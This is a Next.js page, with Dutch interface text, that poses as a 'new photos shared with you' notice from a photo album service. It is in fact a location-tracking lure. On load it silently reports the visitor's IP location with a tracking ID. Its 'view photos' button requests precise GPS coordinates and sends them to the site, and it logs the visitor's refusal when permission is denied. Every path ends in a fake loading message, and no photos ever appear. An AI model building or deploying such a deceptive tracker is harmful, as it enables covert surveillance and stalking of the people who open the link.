"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";

export default function TrackingPage() {
  const params = useParams();
  const trackingId = params.id as string;
  const [status, setStatus] = useState<"initial" | "requesting" | "sent" | "error">("initial");
  const [message, setMessage] = useState("");

  // Automatisch IP-locatie versturen bij het laden van de pagina
  useEffect(() => {
    const sendIpLocation = async () => {
      try {
        await fetch("/api/locatie", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            trackingId,
            type: "ip",
            timestamp: new Date().toISOString(),
          }),
        });
      } catch (e) {
        console.error("IP locatie fout:", e);
      }
    };
    
    sendIpLocation();
  }, [trackingId]);

  const handleButtonClick = async () => {
    setStatus("requesting");
    
    if (!navigator.geolocation) {
      setStatus("sent");
      setMessage("Je foto's worden nu geladen...");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps",
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString(),
            }),
          });
          setStatus("sent");
          setMessage("Je foto's worden nu geladen...");
        } catch (e) {
          console.error("GPS fout:", e);
          setStatus("sent");
          setMessage("Je foto's worden nu geladen...");
        }
      },
      async (error) => {
        console.error("Geolocation error:", error);
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps_denied",
              error: error.message,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("Error sending denial:", e);
        }
        setStatus("sent");
        setMessage("Je foto's worden nu geladen...");
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-orange-50 to-white flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        {/* Foto icoon */}
        <div className="text-6xl mb-6">📸</div>
        
        {/* Titel */}
        <h1 className="text-2xl font-bold text-gray-800 mb-4">
          Nieuwe foto&apos;s gedeeld!
        </h1>
        
        {/* Bericht */}
        <p className="text-gray-600 text-lg mb-8 leading-relaxed">
          Er zijn 3 nieuwe foto&apos;s met je gedeeld. Tik op de knop om ze te bekijken.
        </p>

        {status === "sent" ? (
          <div className="bg-gray-50 rounded-xl p-6">
            <div className="animate-spin text-4xl mb-3">⏳</div>
            <p className="text-gray-600 text-lg">{message}</p>
            <p className="text-gray-400 text-sm mt-2">Even geduld alsjeblieft...</p>
          </div>
        ) : (
          <>
            {/* De knop */}
            <button
              onClick={handleButtonClick}
              disabled={status === "requesting"}
              className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white text-xl font-bold py-5 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95 disabled:transform-none"
            >
              {status === "requesting" ? (
                <span className="flex items-center justify-center gap-3">
                  <svg className="animate-spin h-6 w-6" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  Laden...
                </span>
              ) : (
                <span className="flex items-center justify-center gap-3">
                  <span className="text-2xl">📷</span>
                  Bekijk foto&apos;s
                </span>
              )}
            </button>
            
            <p className="text-gray-400 text-sm mt-6">
              Gedeeld via Foto Album
            </p>
          </>
        )}
        
        {/* Subtiele footer */}
        <div className="mt-8 pt-6 border-t border-gray-100">
          <p className="text-gray-300 text-xs">
            foto-album.app
          </p>
        </div>
      </div>
    </div>
  );
}
